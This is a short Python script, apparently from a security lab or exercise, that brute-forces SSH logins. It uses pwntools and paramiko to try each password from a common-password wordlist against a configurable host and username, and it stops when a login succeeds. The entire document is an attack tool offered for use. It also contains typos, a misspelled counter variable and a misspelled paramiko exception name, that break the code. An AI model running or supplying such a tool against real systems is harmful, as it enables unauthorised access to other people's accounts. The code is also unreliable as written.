from pwn import *
import paramiko

##modify the host IP and the username to match you environment
host = "127.0.0.1"
username = "user"
attempts = 0

with open("ssh-common-passwords.txt", "r") as password_list:
  for password in password_list:
    password = password.strip("\n")
    try:
      print("[{}] Attempting password: '{}'!".format(attemtps, password))
      response = ssh(host=host, user=username, password= password, timeout=1)
      if response.connected():
          print("[>] Valid password found: '{}'!".format(password))
          response.close()
          break 
      response.close()
    except paramiko.ssh_exeception.AuthenticationException:
        print("[X] Invalid password!")
    attempts += 1
            
